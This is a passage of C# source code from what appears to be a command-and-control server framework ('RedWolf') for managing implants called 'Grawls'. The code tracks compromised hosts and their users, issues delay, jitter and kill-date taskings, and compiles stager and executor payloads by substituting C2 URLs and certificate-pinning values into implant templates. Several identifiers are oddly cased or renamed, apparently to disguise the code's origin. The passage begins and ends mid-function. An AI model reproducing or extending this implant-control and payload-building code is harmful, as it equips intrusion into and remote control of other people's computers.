            matchingTheme.TerminalHighlightColor = theme.TerminalHighlightColor;
            matchingTheme.TerminalBorderColor = theme.TerminalBorderColor;

            matchingTheme.NavbarColor = theme.NavbarColor;
            matchingTheme.SidebarColor = theme.SidebarColor;

            matchingTheme.InputColor = theme.InputColor;
            matchingTheme.InputDisabledColor = theme.InputDisabledColor;
            matchingTheme.InputTextColor = theme.InputTextColor;
            matchingTheme.InputHighlightColor = theme.InputHighlightColor;

            matchingTheme.TextLinksColor = theme.TextLinksColor;

            matchingTheme.CodeMirrorTheme = theme.CodeMirrorTheme;
            _context.Themes.Update(matchingTheme);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditTheme(this, matchingTheme);
            return await this.GetTheme(theme.Id);
        }

        public async Task DeleteTheme(int id)
        {
            Theme theme = await this.GetTheme(id);
            _context.Themes.Remove(theme);
            await _notifier.NotifyDeleteTheme(this, id);
            await _context.SaveChangesAsync();
        }
        #endregion

        #region Event Actions
        public async Task<IEnumerable<Event>> GetEvents()
        {
            return await _context.Events.ToListAsync();
        }

        public async Task<Event> GetEvent(int eventId)
        {
            Event anEvent = await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - Event with id: {eventId}");
            }
            return anEvent;
        }

        public Task<long> GetEventTime()
        {
            return Task.FromResult(DateTime.UtcNow.ToBinary());
        }

        public async Task<IEnumerable<Event>> GetEventsAfter(long fromdate)
        {
            DateTime start = DateTime.FromBinary(fromdate);
            return await _context.Events.Where(E => E.Time.CompareTo(start) >= 0).ToListAsync();
        }

        public async Task<IEnumerable<Event>> GetEventsRange(long fromdate, long todate)
        {
            DateTime start = DateTime.FromBinary(fromdate);
            DateTime end = DateTime.FromBinary(todate);
            return await _context.Events.Where(E => E.Time.CompareTo(start) >= 0 && E.Time.CompareTo(end) <= 0).ToListAsync();
        }

        public async Task<Event> CreateEvent(Event anEvent)
        {
            await _context.Events.AddAsync(anEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, anEvent);
            return await this.GetEvent(anEvent.Id);
        }

        public async Task<IEnumerable<Event>> CreateEvents(params Event[] events)
        {
            await _context.Events.AddRangeAsync(events);
            await _context.SaveChangesAsync();
            return events;
        }

        public async Task<IEnumerable<DownloadEvent>> GetDownloadEvents()
        {
            return await _context.Events.Where(E => E.Type == EventType.Download).Select(E => (DownloadEvent)E).ToListAsync();
        }

        public async Task<DownloadEvent> GetDownloadEvent(int eventId)
        {
            DownloadEvent anEvent = (DownloadEvent)await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId && E.Type == EventType.Download);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - DownloadEvent with id: {eventId}");
            }
            return anEvent;
        }

        public async Task<string> GetDownloadContent(int eventId)
        {
            DownloadEvent theEvent = await this.GetDownloadEvent(eventId);
            string filename = Path.Combine(Common.RedWolfDownloadDirectory, theEvent.FileName);
            if (!File.Exists(filename))
            {
                throw new ControllerBadRequestException($"BadRequest - Path does not exist on disk: {filename}");
            }
            try
            {
                return Convert.ToBase64String(File.ReadAllBytes(filename));
            }
            catch (Exception e)
            {
                throw new ControllerBadRequestException($"BadRequest - Unable to read download content from: {filename}{Environment.NewLine}{e.Message}");
            }
        }

        public async Task<DownloadEvent> CreateDownloadEvent(DownloadEvent downloadEvent)
        {
            downloadEvent.Time = DateTime.UtcNow;
            downloadEvent.WriteToDisk();
            await _context.Events.AddAsync(downloadEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, downloadEvent);
            return await this.GetDownloadEvent(downloadEvent.Id);
        }

        public async Task<IEnumerable<ScreenshotEvent>> GetScreenshotEvents()
        {
            return await _context.Events.Where(E => E.Type == EventType.Screenshot).Select(E => (ScreenshotEvent)E).ToListAsync();
        }

        public async Task<ScreenshotEvent> GetScreenshotEvent(int eventId)
        {
            ScreenshotEvent anEvent = (ScreenshotEvent)await _context.Events.FirstOrDefaultAsync(E => E.Id == eventId && E.Type == EventType.Screenshot);
            if (anEvent == null)
            {
                throw new ControllerNotFoundException($"NotFound - ScreenshotEvent with id: {eventId}");
            }
            return anEvent;
        }

        public async Task<string> GetScreenshotContent(int eventId)
        {
            ScreenshotEvent theEvent = await this.GetScreenshotEvent(eventId);
            string filename = System.IO.Path.Combine(Common.RedWolfDownloadDirectory, Utilities.GetSanitizedFilename(theEvent.FileName));
            if (!System.IO.File.Exists(filename))
            {
                throw new ControllerBadRequestException($"BadRequest - Path does not exist on disk: {filename}");
            }
            try
            {
                return Convert.ToBase64String(System.IO.File.ReadAllBytes(filename));
            }
            catch (Exception e)
            {
                throw new ControllerBadRequestException($"BadRequest - Unable to read download content from: {filename}{Environment.NewLine}{e.Message}");
            }
        }

        public async Task<ScreenshotEvent> CreateScreenshotEvent(ScreenshotEvent screenshotEvent)
        {
            screenshotEvent.Time = DateTime.UtcNow;
            screenshotEvent.WriteToDisk();
            await _context.Events.AddAsync(screenshotEvent);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateEvent(this, screenshotEvent);
            return await this.GetScreenshotEvent(screenshotEvent.Id);
        }
        #endregion

        #region ImplantTemplate Actions
        public async Task<IEnumerable<ImplantTemplate>> GetImplantTemplates()
        {
            return await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .ToListAsync();
        }

        public async Task<ImplantTemplate> GetImplantTemplate(int id)
        {
            ImplantTemplate template = await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .FirstOrDefaultAsync(IT => IT.Id == id);
            if (template == null)
            {
                throw new ControllerNotFoundException($"NotFound - ImplantTemplate with id: {id}");
            }
            return template;
        }

        public async Task<ImplantTemplate> GetImplantTemplateByName(string name)
        {
            ImplantTemplate template = await _context.ImplantTemplates
                .Include("ListenerTypeImplantTemplates.ListenerType")
                .FirstOrDefaultAsync(IT => IT.Name == name);
            if (template == null)
            {
                throw new ControllerNotFoundException($"NotFound - ImplantTemplate with Name: {name}");
            }
            return template;
        }

        public async Task<ImplantTemplate> CreateImplantTemplate(ImplantTemplate template)
        {
            List<ListenerType> types = template.CompatibleListenerTypes.ToList();
            template.SetListenerTypeImplantTemplates(new List<ListenerTypeImplantTemplate>());

            await _context.ImplantTemplates.AddAsync(template);
            await _context.SaveChangesAsync();

            foreach (ListenerType type in types)
            {
                await this.CreateEntities(
                    new ListenerTypeImplantTemplate
                    {
                        ListenerType = await this.GetListenerType(type.Id),
                        ImplantTemplate = template
                    }
                );
            }
            await _context.SaveChangesAsync();
            // _notifier.OnCreateImplantTemplate(this, template);
            return await this.GetImplantTemplate(template.Id);
        }

        public async Task<IEnumerable<ImplantTemplate>> CreateImplantTemplates(params ImplantTemplate[] templates)
        {
            List<ImplantTemplate> createdTemplates = new List<ImplantTemplate>();
            foreach (ImplantTemplate template in templates)
            {
                createdTemplates.Add(await this.CreateImplantTemplate(template));
            }
            return createdTemplates;
        }

        public async Task<ImplantTemplate> EditImplantTemplate(ImplantTemplate template)
        {
            ImplantTemplate matchingTemplate = await this.GetImplantTemplate(template.Id);
            matchingTemplate.Name = template.Name;
            matchingTemplate.Description = template.Description;
            matchingTemplate.Language = template.Language;
            matchingTemplate.CommType = template.CommType;
            matchingTemplate.ImplantDirection = template.ImplantDirection;
            matchingTemplate.StagerCode = template.StagerCode;
            matchingTemplate.ExecutorCode = template.ExecutorCode;
            matchingTemplate.CompatibleDotNetVersions = template.CompatibleDotNetVersions;

            IEnumerable<ListenerType> typesToAdd = template.CompatibleListenerTypes.Where(CLT => !matchingTemplate.CompatibleListenerTypes.Select(Two => Two.Id).Contains(CLT.Id));
            IEnumerable<ListenerType> typesToRemove = matchingTemplate.CompatibleListenerTypes.Where(CLT => !template.CompatibleListenerTypes.Select(Two => Two.Id).Contains(CLT.Id));
            foreach (ListenerType type in typesToAdd)
            {
                _context.Add(new ListenerTypeImplantTemplate
                {
                    ImplantTemplateId = matchingTemplate.Id,
                    ListenerTypeId = type.Id
                });
            }
            foreach (ListenerType type in typesToRemove)
            {
                _context.Remove(await _context.FindAsync<ListenerTypeImplantTemplate>(type.Id, matchingTemplate.Id));
            }

            _context.ImplantTemplates.Update(matchingTemplate);
            await _context.SaveChangesAsync();
            // _notifier.OnEditImplantTemplate(this, matchingTemplate);
            return await this.GetImplantTemplate(matchingTemplate.Id);
        }

        public async Task DeleteImplantTemplate(int id)
        {
            ImplantTemplate matchingTemplate = await this.GetImplantTemplate(id);
            _context.ImplantTemplates.Remove(matchingTemplate);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteImplantTemplate(this, matchingTemplate.Id);
        }
        #endregion

        #region Grawl Actions
        public async Task<IEnumerable<Grawl>> GetGrawls()
        {
            List<Grawl> grawls = await _context.Grawls
                .Include(G => G.ImplantTemplate)
                .ToListAsync();
            grawls.ForEach(async G =>
            {
                if (G.Status == GrawlStatus.Active || G.Status == GrawlStatus.Lost)
                {
                    bool lost = await this.IsGrawlLost(G);
                    if (G.Status == GrawlStatus.Active && lost)
                    {
                        G.Status = GrawlStatus.Lost;
                        await this.EditGrawl(G);
                    }
                    else if (G.Status == GrawlStatus.Lost && !lost)
                    {
                        G.Status = GrawlStatus.Active;
                        await this.EditGrawl(G);
                    }
                }
            });
            return grawls;
        }

        public async Task<Grawl> GetGrawl(int grawlId)
        {
            Grawl grawl = await _context.Grawls
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(G => G.Id == grawlId);
            if (grawl == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grawl with id: {grawlId}");
            }
            if (grawl.Status == GrawlStatus.Active || grawl.Status == GrawlStatus.Lost)
            {
                bool lost = await this.IsGrawlLost(grawl);
                if (grawl.Status == GrawlStatus.Active && lost)
                {
                    grawl.Status = GrawlStatus.Lost;
                    await this.EditGrawl(grawl);
                }
                else if (grawl.Status == GrawlStatus.Lost && !lost)
                {
                    grawl.Status = GrawlStatus.Active;
                    await this.EditGrawl(grawl);
                }
            }
            return grawl;
        }

        public async Task<Grawl> GetGrawlByName(string name)
        {
            Grawl grawl = await _context.Grawls
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.Name == name);
            if (grawl == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grawl with name: {name}");
            }
            if (grawl.Status == GrawlStatus.Active || grawl.Status == GrawlStatus.Lost)
            {
                bool lost = await this.IsGrawlLost(grawl);
                if (grawl.Status == GrawlStatus.Active && lost)
                {
                    grawl.Status = GrawlStatus.Lost;
                    await this.EditGrawl(grawl);
                }
                else if (grawl.Status == GrawlStatus.Lost && !lost)
                {
                    grawl.Status = GrawlStatus.Active;
                    await this.EditGrawl(grawl);
                }
            }
            return grawl;
        }

        public async Task<Grawl> GetGrawlByANOTHERID(string anotherid)
        {
            Grawl grawl = await _context.Grawls
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.ANOTHERID == anotherid);
            if (grawl == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grawl with ANOTHERID: {anotherid}");
            }
            if (grawl.Status == GrawlStatus.Active || grawl.Status == GrawlStatus.Lost)
            {
                bool lost = await this.IsGrawlLost(grawl);
                if (grawl.Status == GrawlStatus.Active && lost)
                {
                    grawl.Status = GrawlStatus.Lost;
                    await this.EditGrawl(grawl);
                }
                else if (grawl.Status == GrawlStatus.Lost && !lost)
                {
                    grawl.Status = GrawlStatus.Active;
                    await this.EditGrawl(grawl);
                }
            }
            return grawl;
        }

        public async Task<Grawl> GetGrawlByOriginalServerANOTHERID(string serveranotherid)
        {
            Grawl grawl = await _context.Grawls
                .Include(G => G.ImplantTemplate)
                .FirstOrDefaultAsync(g => g.OriginalServerGuid == serveranotherid);
            if (grawl == null)
            {
                throw new ControllerNotFoundException($"NotFound - Grawl with OriginalServerANOTHERID: {serveranotherid}");
            }
            if (grawl.Status == GrawlStatus.Active || grawl.Status == GrawlStatus.Lost)
            {
                bool lost = await this.IsGrawlLost(grawl);
                if (grawl.Status == GrawlStatus.Active && lost)
                {
                    grawl.Status = GrawlStatus.Lost;
                    await this.EditGrawl(grawl);
                }
                else if (grawl.Status == GrawlStatus.Lost && !lost)
                {
                    grawl.Status = GrawlStatus.Active;
                    await this.EditGrawl(grawl);
                }
            }
            return grawl;
        }

        public async Task<bool> IsGrawlLost(Grawl g)
        {
            DateTime lostTime = g.LastCheckIn;
            int Drift = 10;
            lostTime = lostTime.AddSeconds(g.Delay + (g.Delay * (g.JItterPercent / 100.0)) + Drift);
            if (g.ImplantTemplate.ImplantDirection == ImplantDirection.Pull)
            {
                return DateTime.UtcNow >= lostTime;
            }
            if (DateTime.UtcNow < lostTime)
            {
                return false;
            }

            Grawl sg = await _context.Grawls
                    .Where(GR => GR.Id == g.Id)
                    .Include(GR => GR.GrawlCommands)
                    .ThenInclude(GC => GC.GrawlTasking)
                    .FirstOrDefaultAsync();
            if (sg != null && sg.GrawlCommands != null && sg.GrawlCommands.Count > 0)
            {
                GrawlCommand lastCommand = sg.GrawlCommands
                    .Where(GC => GC.GrawlTasking != null)
                    .OrderByDescending(GC => GC.CommandTime)
                    .FirstOrDefault();
                if (lastCommand != null && (lastCommand.GrawlTasking.Status == GrawlTaskingStatus.Uninitialized || lastCommand.GrawlTasking.Status == GrawlTaskingStatus.Tasked))
                {
                    lostTime = lastCommand.CommandTime;
                    return DateTime.UtcNow >= lastCommand.CommandTime.AddSeconds(g.Delay + (g.Delay * (g.JItterPercent / 100.0)) + Drift);
                }
            }
            return false;
        }

        public async Task<List<string>> GetPathToChildGrawl(int grawlId, int childId)
        {
            Grawl grawl = await this.GetGrawl(grawlId);
            List<string> path = new List<string>();
            bool found = GetPathToChildGrawl(grawlId, childId, ref path);
            if (!found)
            {
                throw new ControllerNotFoundException($"NotFound - Path from Grawl with id: {grawlId} to Grawl with id: {childId}");
            }
            path.Add(grawl.ANOTHERID);
            path.Reverse();
            return path;
        }

        public async Task<Grawl> GetOutboundGrawl(int grawlId)
        {
            Grawl grawl = await this.GetGrawl(grawlId);
            Grawl parent = await _context.Grawls.FirstOrDefaultAsync(G => G.Children.Contains(grawl.ANOTHERID));
            while (parent != null)
            {
                grawl = parent;
                parent = await _context.Grawls.FirstOrDefaultAsync(G => G.Children.Contains(grawl.ANOTHERID));
            }
            return grawl;
        }

        public async Task<Grawl> CreateGrawl(Grawl grawl)
        {
            TargetIndicator indicator = await _context.Indicators.Where(I => I.Type == IndicatorType.TargetIndicator)
                .Select(T => (TargetIndicator)T)
                .FirstOrDefaultAsync(T => T.ComputerName == grawl.Hostname && T.UserName == grawl.UserDomainName + "\\" + grawl.UserName);
            if (indicator == null && !string.IsNullOrWhiteSpace(grawl.Hostname))
            {
                await _context.Indicators.AddAsync(new TargetIndicator
                {
                    ComputerName = grawl.Hostname,
                    UserName = grawl.UserName,
                });
            }
            grawl.ImplantTemplate = await this.GetImplantTemplate(grawl.ImplantTemplateId);
            await _context.Grawls.AddAsync(grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrawl(this, grawl);
            return await this.GetGrawl(grawl.Id);
        }

        public async Task<IEnumerable<Grawl>> CreateGrawls(params Grawl[] grawls)
        {
            foreach (Grawl g in grawls)
            {
                await this.CreateGrawl(g);
            }
            return grawls;
        }

        public async Task<Grawl> EditGrawl(Grawl grawl, RedWolfUser user = null)
        {
            Grawl matching_grawl = await this.GetGrawl(grawl.Id);
            if (matching_grawl.Status != GrawlStatus.Active && matching_grawl.Status != GrawlStatus.Lost && grawl.Status == GrawlStatus.Active)
            {
                if (matching_grawl.Status != GrawlStatus.Disconnected)
                {
                    grawl.ActivationTime = DateTime.UtcNow;
                }
                Event grawlEvent = new Event
                {
                    Time = grawl.ActivationTime,
                    MessageHeader = "Grawl Activated",
                    MessageBody = "Grawl: " + grawl.Name + " from: " + grawl.Hostname + " has been activated!",
                    Level = EventLevel.Highlight,
                    Context = "*"
                };
                await _context.Events.AddAsync(grawlEvent);
                await _notifier.NotifyCreateEvent(this, grawlEvent);
            }
            matching_grawl.Name = grawl.Name;
            matching_grawl.ANOTHERID = grawl.ANOTHERID;
            matching_grawl.OriginalServerGuid = grawl.OriginalServerGuid;

            matching_grawl.ListenerId = grawl.ListenerId;
            matching_grawl.Listener = await this.GetListener(grawl.ListenerId);

            matching_grawl.ImplantTemplateId = grawl.ImplantTemplateId;
            matching_grawl.ImplantTemplate = await this.GetImplantTemplate(grawl.ImplantTemplateId);

            matching_grawl.UserDomainName = grawl.UserDomainName;
            matching_grawl.UserName = grawl.UserName;
            matching_grawl.Status = grawl.Status;
            matching_grawl.Integrity = grawl.Integrity;
            matching_grawl.Process = grawl.Process;
            matching_grawl.LastCheckIn = grawl.LastCheckIn;
            matching_grawl.ActivationTime = grawl.ActivationTime;
            matching_grawl.IPAddress = grawl.IPAddress;
            matching_grawl.Hostname = grawl.Hostname;
            matching_grawl.OperatingSystem = grawl.OperatingSystem;

            matching_grawl.Children = grawl.Children;
            matching_grawl.ValCerT = grawl.ValCerT;
            matching_grawl.UsCertPin = grawl.UsCertPin;
            matching_grawl.SMBPipeName = grawl.SMBPipeName;
            matching_grawl.Note = grawl.Note;

            if (matching_grawl.Status == grawl.Status && (matching_grawl.Status == GrawlStatus.Active || matching_grawl.Status == GrawlStatus.Lost))
            {
                if (matching_grawl.ConneCTAttEmpts != grawl.ConneCTAttEmpts)
                {
                    GrawlTask setTask = await this.GetGrawlTaskByName("Set", matching_grawl.DotNetVersion);
                    setTask.Options[0].Value = "ConneCTAttEmpts";
                    setTask.Options[1].Value = grawl.ConneCTAttEmpts.ToString();
                    GrawlCommand createdGrawlCommand = await this.CreateGrawlCommand(new GrawlCommand
                    {
                        Command = "Set ConneCTAttEmpts " + grawl.ConneCTAttEmpts.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGrawlTasking(new GrawlTasking
                    {
                        Id = 0,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        GrawlTaskId = setTask.Id,
                        GrawlTask = setTask,
                        Status = GrawlTaskingStatus.Uninitialized,
                        Type = GrawlTaskingType.SetConneCTAttEmpts,
                        Parameters = new List<string> { "ConneCTAttEmpts", grawl.ConneCTAttEmpts.ToString() },
                        GrawlCommand = createdGrawlCommand,
                        GrawlCommandId = createdGrawlCommand.Id
                    });
                }
                if (matching_grawl.Delay != grawl.Delay)
                {
                    GrawlTask setTask = await this.GetGrawlTaskByName("Set", matching_grawl.DotNetVersion);
                    setTask.Options[0].Value = "Delay";
                    setTask.Options[1].Value = grawl.Delay.ToString();
                    GrawlCommand createdGrawlCommand = await this.CreateGrawlCommand(new GrawlCommand
                    {
                        Command = "Set Delay " + grawl.Delay.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGrawlTasking(new GrawlTasking
                    {
                        Id = 0,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        GrawlTaskId = setTask.Id,
                        GrawlTask = setTask,
                        Status = GrawlTaskingStatus.Uninitialized,
                        Type = GrawlTaskingType.SetDelay,
                        Parameters = new List<string> { "Delay", grawl.Delay.ToString() },
                        GrawlCommand = createdGrawlCommand,
                        GrawlCommandId = createdGrawlCommand.Id
                    });
                }
                if (matching_grawl.JItterPercent != grawl.JItterPercent)
                {
                    GrawlTask setTask = await this.GetGrawlTaskByName("Set", matching_grawl.DotNetVersion);
                    setTask.Options[0].Value = "JItterPercent";
                    setTask.Options[1].Value = grawl.JItterPercent.ToString();
                    GrawlCommand createdGrawlCommand = await this.CreateGrawlCommand(new GrawlCommand
                    {
                        Command = "Set JItterPercent " + grawl.JItterPercent.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGrawlTasking(new GrawlTasking
                    {
                        Id = 0,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        GrawlTaskId = setTask.Id,
                        GrawlTask = setTask,
                        Status = GrawlTaskingStatus.Uninitialized,
                        Type = GrawlTaskingType.SetJItter,
                        Parameters = new List<string> { "JItterPercent", grawl.JItterPercent.ToString() },
                        GrawlCommand = createdGrawlCommand,
                        GrawlCommandId = createdGrawlCommand.Id
                    });
                }
                if (matching_grawl.KillDate != grawl.KillDate)
                {
                    GrawlTask setTask = await this.GetGrawlTaskByName("Set", matching_grawl.DotNetVersion);
                    setTask.Options[0].Value = "KillDate";
                    setTask.Options[1].Value = grawl.KillDate.ToString();
                    GrawlCommand createdGrawlCommand = await this.CreateGrawlCommand(new GrawlCommand
                    {
                        Command = "Set KillDate " + grawl.KillDate.ToString(),
                        CommandTime = DateTime.UtcNow,
                        User = user,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        CommandOutputId = 0,
                        CommandOutput = new CommandOutput()
                    });
                    await this.CreateGrawlTasking(new GrawlTasking
                    {
                        Id = 0,
                        GrawlId = grawl.Id,
                        Grawl = grawl,
                        GrawlTaskId = setTask.Id,
                        GrawlTask = setTask,
                        Status = GrawlTaskingStatus.Uninitialized,
                        Type = GrawlTaskingType.SetKillDate,
                        Parameters = new List<string> { "KillDate", grawl.KillDate.ToString() },
                        GrawlCommand = createdGrawlCommand,
                        GrawlCommandId = createdGrawlCommand.Id
                    });
                }
            }

            matching_grawl.DotNetVersion = grawl.DotNetVersion;
            matching_grawl.RuntimeIdentifier = grawl.RuntimeIdentifier;

            matching_grawl.GrawlChallenge = grawl.GrawlChallenge;
            matching_grawl.GrawlNegotiatedSessKEy = grawl.GrawlNegotiatedSessKEy;
            matching_grawl.GrawlRSAPublicKey = grawl.GrawlRSAPublicKey;
            matching_grawl.GrawlSharedSecretPassword = grawl.GrawlSharedSecretPassword;
            matching_grawl.PowerShellImport = grawl.PowerShellImport;

            TargetIndicator indicator = (await this.GetTargetIndicators())
                .FirstOrDefault(T => T.ComputerName == grawl.Hostname && T.UserName == grawl.UserDomainName + "\\" + grawl.UserName);

            if (indicator == null && !string.IsNullOrWhiteSpace(grawl.Hostname))
            {
                indicator = new TargetIndicator
                {
                    ComputerName = grawl.Hostname,
                    UserName = grawl.UserDomainName + "\\" + grawl.UserName
                };
                await _context.Indicators.AddAsync(indicator);
                // _notifier.OnCreateIndicator(this, indicator);
            }
            _context.Grawls.Update(matching_grawl);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGrawl(this, matching_grawl);
            return matching_grawl;
        }

        public async Task DeleteGrawl(int grawlId)
        {
            Grawl grawl = await this.GetGrawl(grawlId);
            _context.Grawls.Remove(grawl);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGrawl(this, grawl.Id);
        }

        public async Task<List<string>> GetCommandSuggestionsForGrawl(Grawl grawl)
        {
            IEnumerable<GrawlTasking> taskings = await this.GetGrawlTaskingsForGrawl(grawl.Id);
            List<string> suggestions = new List<string>();
            foreach (GrawlTask task in await this.GetGrawlTasks())
            {
                if (!task.Name.StartsWith("SharpShell-", StringComparison.Ordinal) && task.CompatibleDotNetVersions.Contains(grawl.DotNetVersion))
                {
                    suggestions.Add(task.Name);
                    GetCommandSuggestionsForTaskRecursive(task, 0, task.Name, ref suggestions);
                    foreach (var altname in task.Aliases)
                    {
                        suggestions.Add(altname);
                        GetCommandSuggestionsForTaskRecursive(task, 0, altname, ref suggestions);
                    }
                }
            }
            suggestions.AddRange(new List<string> { "Note" });
            return suggestions;
        }

        private void GetCommandSuggestionsForTaskRecursive(GrawlTask task, int index, string progress, ref List<string> suggestions)
        {
            if (index >= task.Options.Count)
            {
                return;
            }
            foreach (var s in task.Options[index].SuggestedValues)
            {
                suggestions.Add(progress + " " + s);
                GetCommandSuggestionsForTaskRecursive(task, index + 1, progress + " " + s, ref suggestions);
            }
        }

        public async Task<byte[]> CompileGrawlStagerCode(int id, Launcher launcher)
        {
            Grawl grawl = await this.GetGrawl(id);
            ImplantTemplate template = await this.GetImplantTemplate(grawl.ImplantTemplateId);
            Listener listener = await this.GetListener(grawl.ListenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            return CompileGrawlCode(template.StagerCode, template, grawl, listener, profile, launcher);
        }

        public async Task<byte[]> CompileGrawlExecutorCode(int id, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false)
        {
            Grawl grawl = await this.GetGrawl(id);
            ImplantTemplate template = await this.GetImplantTemplate(grawl.ImplantTemplateId);
            Listener listener = await this.GetListener(grawl.ListenerId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            return CompileGrawlCode(template.ExecutorCode, template, grawl, listener, profile, outputKind, Compress, grawl.RuntimeIdentifier);
        }

        private byte[] CompileGrawlCode(string CodeTemplate, ImplantTemplate template, Grawl grawl, Listener listener, Profile profile, Launcher launcher)
        {
            return CompileGrawlCode(CodeTemplate, template, grawl, listener, profile, launcher.OutputKind, launcher.CompressStager, launcher.RuntimeIdentifier);
        }

        private byte[] CompileGrawlCode(string CodeTemplate, ImplantTemplate template, Grawl grawl, Listener listener, Profile profile, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false, Compiler.RuntimeIdentifier runtimeIdentifier = Compiler.RuntimeIdentifier.win_x64)
        {
            byte[] ILBytes = null;
            if (grawl.DotNetVersion == Common.DotNetVersion.Net35 || grawl.DotNetVersion == Common.DotNetVersion.Net40)
            {
                List<Compiler.Reference> references = null;
                switch (grawl.DotNetVersion)
                {
                    case Common.DotNetVersion.Net35:
                        references = Common.DefaultNet35References;
                        break;
                    case Common.DotNetVersion.Net40:
                        references = Common.DefaultNet40References;
                        break;
                }
                ILBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                {
                    Language = template.Language,
                    Source = this.GrawlTemplateReplace(CodeTemplate, template, grawl, listener, profile),
                    TargetDotNetVersion = grawl.DotNetVersion,
                    OutputKind = outputKind,
                    References = references
                });
            }
            else if (grawl.DotNetVersion == Common.DotNetVersion.NetCore31)
            {
                string src = this.GrawlTemplateReplace(CodeTemplate, template, grawl, listener, profile);
                string sanitizedName = Utilities.GetSanitizedFilename(template.Name);
                string dir = Common.RedWolfDataDirectory + "Grawl" + Path.DirectorySeparatorChar + sanitizedName + Path.DirectorySeparatorChar;
                string ResultName;
                if (template.StagerCode == CodeTemplate)
                {
                    ResultName = sanitizedName + "Stager";
                    dir += sanitizedName + "Stager" + Path.DirectorySeparatorChar;
                    string file = sanitizedName + "Stager" + Utilities.GetExtensionForLanguage(template.Language);
                    File.WriteAllText(dir + file, src);
                }
                else
                {
                    ResultName = sanitizedName;
                    dir += sanitizedName + Path.DirectorySeparatorChar;
                    string file = sanitizedName + Utilities.GetExtensionForLanguage(template.Language);
                    File.WriteAllText(dir + file, src);
                }
                ILBytes = Compiler.Compile(new Compiler.CsharpCoreCompilationRequest
                {
                    ResultName = ResultName,
                    Language = template.Language,
                    TargetDotNetVersion = grawl.DotNetVersion,
                    SourceDirectory = dir,
                    OutputKind = outputKind,
                    RuntimeIdentifier = runtimeIdentifier,
                    UseSubprocess = true
                });
            }
            if (ILBytes == null || ILBytes.Length == 0)
            {
                throw new RedWolfCompileGrawlStagerFailedException("Compiling Grawl code failed");
            }
            if (Compress)
            {
                ILBytes = Utilities.Compress(ILBytes);
            }
            return ILBytes;
        }

        private string GrawlTemplateReplace(string CodeTemplate, ImplantTemplate template, Grawl grawl, Listener listener, Profile profile)
        {
            switch (profile.Type)
            {
                case ProfileType.HTTP:
                    HttpProfile httpProfile = (HttpProfile)profile;
                    HttpListener httpListener = (HttpListener)listener;
                    if (template.CommType == CommunicationType.HTTP)
                    {
                        return CodeTemplate
                            .Replace("// {{REP_PROF_MESSAGE_TRANSFORM}}", profile.MessageTransform)
                            .Replace("{{REP_PROF_HTTP_HEADER_NAMES}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpRequestHeaders.Select(H => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(H.Name))))))
                            .Replace("{{REP_PROF_HTTP_HEADER_VALUES}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpRequestHeaders.Select(H => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(H.Value))))))
                            .Replace("{{REP_PROF_HTTP_URLS}}", this.FormatForVerbatimString(string.Join(",", httpProfile.HttpUrls.Select(H => Convert.ToBase64String(Common.RedWolfEncoding.GetBytes(H))))))
                            .Replace("{{REP_PROF_HTTP_GET_RESPONSE}}", this.FormatForVerbatimString(httpProfile.HttpGetResponse.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}")))
                            .Replace("{{REP_PROF_HTTP_POST_REQUEST}}", this.FormatForVerbatimString(httpProfile.HttpPostRequest.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}")))
                            .Replace("{{REP_PROF_HTTP_POST_RESPONSE}}", this.FormatForVerbatimString(httpProfile.HttpPostResponse.Replace("{DATA}", "{0}").Replace("{ANOTHERID}", "{1}")))
                            .Replace("{{REP_VAL_CERT}}", grawl.ValCerT ? "true" : "false")
                            .Replace("{{REP_USE_CERT_PINNING}}", grawl.UsCertPin ? "true" : "false")
                            .Replace("{{REP_PIPE_NAME}}", grawl.SMBPipeName)
                            .Replace("{{REP_REDWOLF_URIS}}", this.FormatForVerbatimString(string.Join(",", httpListener.Urls)))
                            .Replace("{{REP_REDWOLF_CERT_HASH}}", this.FormatForVerbatimString(httpListener.UseSSL ? httpListener.SSLCertHash : ""))
